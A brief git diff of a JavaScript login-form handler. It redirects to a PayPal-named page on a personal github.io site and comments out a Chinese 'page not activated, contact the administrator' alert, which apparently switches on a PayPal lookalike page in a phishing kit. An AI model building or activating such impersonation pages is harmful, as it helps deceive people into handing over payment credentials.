@@ -16,7 +16,7 @@ loginForm.addEventListener('submit', function (e) {
             alert('网页未开通，请联系管理员开通网页！')
         } else if (version === 'paypal'){
             window.location.href = 'https://jongaha.github.io/Paypals/';
-            alert('网页未开通，请联系管理员开通网页！')
+            // alert('网页未开通，请联系管理员开通网页！')
         } else if (version === 'paypal_mobile'){
           //  window.location.href = 'https://jongaha.github.io/paypal_m/';
             alert('网页未开通，请联系管理员开通网页！')
